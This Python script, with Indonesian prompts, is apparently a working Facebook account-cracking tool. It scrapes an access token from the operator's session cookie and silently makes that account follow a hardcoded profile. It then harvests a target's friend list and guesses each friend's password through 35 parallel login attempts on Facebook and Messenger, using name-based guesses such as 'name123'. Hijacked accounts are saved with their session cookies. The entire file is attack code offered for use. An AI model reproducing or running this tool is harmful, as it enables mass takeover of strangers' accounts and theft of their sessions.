import time, requests, re, platform, os, sys
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as bsr

idz=[]

class login:

    def __init__(self):
        self.host = ('%s'%('https://m.facebook.com'))
        self.reqz = requests.Session()
        self.menu()

    def menu(self):
        try:
            cokie = {'cookie': open("cokie","r").read()}
            token = open("token","r").read()
        except FileNotFoundError:
            self.logcok()
        try:
            capi = requests.get(f"https://graph.facebook.com/me?access_token={token}", cookies=cokie).json()
            nama = capi.get('name')
            user = capi.get('id')
        except AttributeError:
            self.logcok()
        except requests.exceptions.ConnectionError:
            exit('anda tidak memiliki koneksi yang stabil')
        platform_ = platform.system().startswith("Linux" or "linux")
        os.system("clear" if platform_ is True else "cls")
        print(f'Hi {nama} ({user})\n')
        print('1. crack akun publik\n2. check hasil crack\n3. keluar\n')
        jnck = input("masukan pilihanmu: ")
        if jnck in ('',' ','  '):exit()
        elif jnck in ('1','01'):
             print('\nmasukan username atau userid, tidak berlaku crack massal jadi cukup masukan 1 target')
             target = input('masukan target: ')
             if target.isnumeric() is False:acc = self.convert(target, cokie)
             else:acc = target
             try:
                  url = requests.get(f"https://graph.facebook.com/v16.0/{acc}/friends?access_token={token}&limit=5000", cookies=cokie).json()
                  for akn in url['data']:
 #                     print(akn)
                      idz.append(akn['id']+'<=>'+akn['name'])
             except KeyError:
                 exit('\ntidak ada teman yang di tampilkan')
             mains()
        elif jnck in ('2','02'):
             print('\n1. cek hasil akun OK\n2. cek hasil akun CP\n3. keluar\n')
             its = input("masukan pilihanmu: ")
             if its in ('',' ','  ','3','03'):exit()
             elif its in ('2','02'):
                 print('-'*30)
                 os.system('ul CP/CP.txt')
             elif its in ('1','01'):
                 print('-'*30)
                 os.system('ul OK/OK.txt')
             else:exit()

        elif jnck in ('3','03'):exit()
        else:self.menu()

    def logcok(self):
        platform_ = platform.system().startswith("Linux" or "linux")
        os.system("clear" if platform_ is True else "cls")
        cok = {'cookie': input('masukan cookie: ')}
        try:
             url = requests.get('https://adsmanager.facebook.com/adsmanager', cookies=cok).text
             idm = re.findall('act=(\d+)', url)[0]
#             print(idm)
             xxx = requests.get("https://adsmanager.facebook.com/adsmanager/manage/accounts?act=" + idm, cookies=cok).text
             token = re.search('(EAAB\w+)', str(xxx))
             if token is None:
                exit('\ncookie anda tidak valid')
             else:
                open('token','w').write(token.group(1))
                self.bot(cok)
        except (IndexError,AttributeError):
             exit('\ncookie anda tidak valid')
        except requests.exceptions.ConnectionError:
            exit('\nanda tidak memiliki koneksi yang stabil')

    def bot(self, kuki):
        try:
             url = bsr(self.reqz.get("%s/%s"%(self.host, "100000834003593"), cookies=kuki).text,"html.parser")
             if "Ikuti" or "Follow" in url.find_all('a', href=True):
                 for hrf in url.find_all('a', href=True):
                     if "/a/subscribe.php?" in hrf.get('href'):
                         p = self.reqz.get('%s%s'%(self.host,hrf.get('href')), cookies=kuki).text
             open("cokie","w").write(kuki.get('cookie'))
             exit('\n[✓] Jalankan ulang dengan perintah: python3 %s'%(sys.argv[0]))
        except Exception as e:
            exit('\n%s'%(e))

    def convert(self, username, xxx):
        url = bsr(self.reqz.get("%s/%s"%(self.host, username), cookies=xxx).text,'html.parser')
        for wes in url.find_all('a', href=True):
            if '/mbasic/more/?' in wes.get("href"):
                uid = re.findall('owner_id=(\d+)&', str(wes['href']))[0]
                return uid
class mains:

    def __init__(self):
        self.ok, self.cp = [], []
        self.lp = 0
        self.metode()

    def metode(self):
        print('\n1. crack dengan metode web reguler\n2. crack dengan metode web messengger\n')
        jnck = input('masukan pilihanmu: ')
        exit() if jnck in ('',' ','  ') else self.pas(jnck)

    def pas(self, metod):
        print('\nGunakan password manual (input) atau default (bawaan) M/D')
        ind = input('masukan pilihanmu: ')
        if ind in ('',' ','  '):exit()
        elif ind in ('m','M','manual'):
             print('\nGunakan tanda koma sebagai pemisah contoh indonesia,sayang')
             pw = input('masukan sandi: ')
             for z in pw.split(','):
                 if len(z) <=5:
                    exit('\nPastikan sandi lebih dari 5 karakter')
             self.submit_m(pw.split(','), metod)
        else:
             self.submit_o(metod)
    def submit_o(self, methode):
        print('\nakun OK di simpan : OK/OK.txt\nakun CP di simpan : CP/CP.txt\n')
        with ThreadPoolExecutor(max_workers=35) as sve:
            for i in idz:
                id, nama = i.split("<=>")
                fullname = nama.split(' ')[0].lower()
                if len(nama) <=5:
                    if len(fullname) <=2:pass
                    else:
                        kpt = fullname.capitalize()
                        pwd = [fullname + '123',fullname + '1234',fullname + '12345',kpt + '123',kpt + '1234']
                else:
                    if len(fullname) <=2:pass
                    else:
                         kpt = fullname.capitalize()
                         pwd = [fullname + '123',fullname + '1234',fullname + '12345',kpt + '123',kpt + '1234', nama, nama.lower()]
                try:
                    if methode in ('1','01'):
                       sve.submit(self.reguler, id, pwd)
                    else:
                       sve.submit(self.messenger, id, pwd)
                except Exception as e:pass
        exit(f'\n\ncrack telah selesai total OK: {len(self.ok)} & total CP: {len(self.cp)}. dari {len(idz)} id')

    def submit_m(self, sandine, methode):
        print('\nakun OK di simpan : OK/OK.txt\nakun CP di simpan : CP/CP.txt\n')
        with ThreadPoolExecutor(max_workers=35) as sve:
            for ii in idz:
                id = ii.split('<=>')[0]
                if methode in ('1','01'):
                    sve.submit(self.reguler, id, sandine)
                else:
                    sve.submit(self.messenger, id, sandine)
        exit(f'\n\ncrack telah selesai total OK: {len(self.ok)} & total CP: {len(self.cp)}. dari {len(idz)} id')

    def messenger(self, akunid, listpw):
        print('\rCrack %s/%s OK:-%s CP:-%s'%(len(idz), self.lp, len(self.ok), len(self.cp)), end=" ")
        for pw in listpw:
            try:
                 ses     = requests.Session()
                 _login_ = ses.get("https://www.messenger.com/").text
                 headers = {
                    "Host": "www.messenger.com",
                    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
                    "cache-control": "max-age=0",
                    "content-type": "application/x-www-form-urlencoded",
                    "sec-ch-ua": "\"Not:A-Brand\";v=\"99\", \"Chromium\";v=\"112\"",
                    "sec-ch-ua-mobile": "?1",
                    "sec-ch-ua-platform": "\"Linux\"",
                    "sec-fetch-dest": "document",
                    "sec-fetch-mode": "navigate",
                    "sec-fetch-site": "same-origin",
                    "sec-fetch-user": "?1",
                    "upgrade-insecure-requests": "1",
                    "referrer": "https://www.messenger.com/",
                    "referrerPolicy": "origin-when-cross-origin",
                    "user-agent": 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 Edg/112.0.1722.48',
                 }
                 try:
                      jazoest = re.search('name="jazoest" value="(.*?)"', str(_login_)).group(1)
                      lsd     = re.search('name="lsd" value="(.*?)"', str(_login_)).group(1)
                      initial_request_id = re.search('name="initial_request_id" value="(.*?)"', str(_login_)).group(1)
                      lgnjs    = re.search('name="lgnjs" value="(.*?)"', str(_login_)).group(1)
                      lgnrnd   = re.search('name="lgnrnd" value="(.*?)"', str(_login_)).group(1)
                      lgndim   = re.search('name="lgndim" value="(.*?)"', str(_login_)).group(1)
                      jsdatr   = re.search('"_js_datr","(.*?)"', str(_login_)).group(1)
                 except Exception as e:
                      jsdatr = 'yO0-ZCbjUBWogjc-b4lEOOEw'

                 headers.update({'cookie':f'wl_cbv=v2%3Bclient_version%3A2215%3Btimestamp%3A{str(time.time())[:10]}; vpd=v1%3B646x360x2; m_pixel_ratio=2; _js_datr={jsdatr}'})
                 Body = {
                    "jazoest": jazoest,
                    "lsd": lsd,
                    "initial_request_id": initial_request_id,
                    "timezone": "",
                    "lgndim": lgndim,
                    "lgnrnd": lgnrnd,
                    "lgnjs": lgnjs,
                    "email": akunid,
                    "pass": pw,
                    "login": 1,
                    "persistent": 1,
                    "default_persistent": ""
                 }
                 Resp = ses.post("https://www.messenger.com/login/password/", data=Body, headers=headers, allow_redirects=True)
                 if 'checkpoint_interstitial' in Resp.url or 'https://www.messenger.com/login/checkpoint_interstitial/' in Resp.url:
                     self.cp.append(akunid[:2])
                     print('\r *  --> %s|%s        '%(akunid, pw))
                     with open('CP/CP.txt','a', encoding='utf-8') as save_item:
                        save_item.write('%s|%s\n'%(akunid,pw))
                     break

                 elif 'c_user' in ses.cookies.get_dict().keys():
                     self.ok.append(akunid[:2])
                     cokie = (';').join([ name + '='+ value for name, value in ses.cookies.get_dict().items()])
                     print('\r *  --> %s|%s|%s'%(akunid, pw, cokie))
                     with open('OK/OK.txt','a', encoding='utf-8') as save_item:
                        save_item.write('%s|%s|%s\n'%(akunid, pw, cokie))
                     break

            except requests.exceptions.ConnectionError:
                time.sleep(15)
        self.lp +=1
    def reguler(self, akunid, listpw):
        print('\rCrack %s/%s OK:-%s CP:-%s'%(len(idz), self.lp, len(self.ok), len(self.cp)), end=" ")
        for pwx in listpw:
            try:
                 ses  = requests.Session()
                 Agen = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 Edg/112.0.1722.48'
                 _login_ = ses.get("https://web.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNjgxNzQyMTgwLCJjYWxsc2l0ZV9pZCI6Mjc2MjMwNjIxNzQyMjQ4NX0%3D&next=https%3A%2F%2Fdevelopers.facebook.com%2Fproducts%2Fmessenger%2F&_rdc=1&_rdr").text
                 _cokie_ = (";").join([key + '='+ value for key, value in ses.cookies.get_dict().items()])
                 _cokie_ += ';_js_datr=' + re.search('"_js_datr","(.*?)"', _login_).group(1) + ';'
                 headers = {
                    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
                    "cache-control": "max-age=0",
                    "content-type": "application/x-www-form-urlencoded",
                    "sec-ch-ua": "\"Not:A-Brand\";v=\"99\", \"Chromium\";v=\"112\"",
                    "sec-ch-ua-mobile": "?0",
                    "sec-ch-ua-platform": "\"Linux\"",
                    "sec-fetch-dest": "document",
                    "sec-fetch-mode": "navigate",
                    "sec-fetch-site": "same-origin",
                    "sec-fetch-user": "?1",
                    "upgrade-insecure-requests": "1",
                    "referrer": "https://web.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNjgxNzQyMTgwLCJjYWxsc2l0ZV9pZCI6Mjc2MjMwNjIxNzQyMjQ4NX0%3D&next=https%3A%2F%2Fdevelopers.facebook.com%2Fproducts%2Fmessenger%2F&_rdc=1&_rdr",
                    "referrerPolicy": "origin-when-cross-origin",
                    "cookie": _cokie_,
                    "user-agent": Agen
                 }
                 try:
                      jazoest = re.search('name="jazoest" value="(.*?)"', _login_).group(1)
                      lsd     = re.search('name="lsd" value="(.*?)"', _login_).group(1)
                      display = re.search('name="display" value="(.*?)"', _login_).group(1)
                      isprivat = re.search('name="isprivate" value="(.*?)"', _login_).group(1)
                      lgndim   = re.search('name="lgndim" value="(.*?)"', _login_).group(1)
                      lgnjs    = re.search('name="lgnjs" value="(.*?)"', _login_).group(1)
                      lgnrnd   = re.search('name="lgnrnd" value="(.*?)"', _login_).group(1)
                 except:pass

                 Body = f"jazoest={jazoest}&lsd={lsd}&display={display}&isprivate={isprivat}&return_session=&skip_api_login=&signed_next=&trynum=1&timezone=-420&lgndim={lgndim}&lgnrnd={lgnrnd}&lgnjs={lgnjs}&email={akunid}&prefill_contact_point=&prefill_source=&prefill_type=&first_prefill_source=&first_prefill_type=&had_cp_prefilled=false&had_password_prefilled=false&encpass=#PWD_BROWSER:0:{str(time.time())[:10]}:{pwx}"
                 Resp = ses.post("https://web.facebook.com/login/device-based/regular/login/?login_attempt=1&next=https%3A%2F%2Fdevelopers.facebook.com%2Fproducts%2Fmessenger%2F&lwv=100", data=Body, headers=headers, allow_redirects=False)
                 if "c_user" in ses.cookies.get_dict().keys():
                     self.ok.append(akunid[:2])
                     cokie = (';').join([ name + '='+ value for name, value in ses.cookies.get_dict().items()])
                     print('\r *  --> %s|%s|%s'%(akunid, pwx, cokie))
                     with open('OK/OK.txt','a', encoding='utf-8') as save_item:
                        save_item.write('%s|%s|%s\n'%(akunid, pwx, cokie))
                     break
                 elif "checkpoint" in ses.cookies.get_dict().keys():
                     self.cp.append(akunid[:2])
                     print('\r *  --> %s|%s        '%(akunid, pwx))
                     with open('CP/CP.txt','a', encoding='utf-8') as save_item:
                        save_item.write('%s|%s\n'%(akunid,pwx))
                     break
            except requests.exceptions.ConnectionError:
                time.sleep(25)
        self.lp +=1


if __name__ == '__main__':
   login()